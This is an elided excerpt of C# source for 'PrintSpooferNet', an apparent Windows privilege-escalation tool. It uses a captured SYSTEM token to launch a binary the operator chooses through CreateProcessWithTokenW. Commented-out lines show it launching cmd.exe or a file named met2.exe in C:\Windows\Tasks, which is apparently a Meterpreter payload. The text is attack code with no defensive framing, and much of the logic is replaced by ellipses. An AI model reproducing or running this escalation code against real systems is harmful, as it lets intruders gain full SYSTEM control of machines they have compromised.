...
namespace PrintSpooferNet
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            uint PIPE_WAIT_BYTE = 0x00000000;
            ...
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename binary");
                return;
            }
            ...
            RevertToSelf();
            //res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\System32\\cmd.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
            //res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\Windows\\Tasks\\met2.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, binary, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
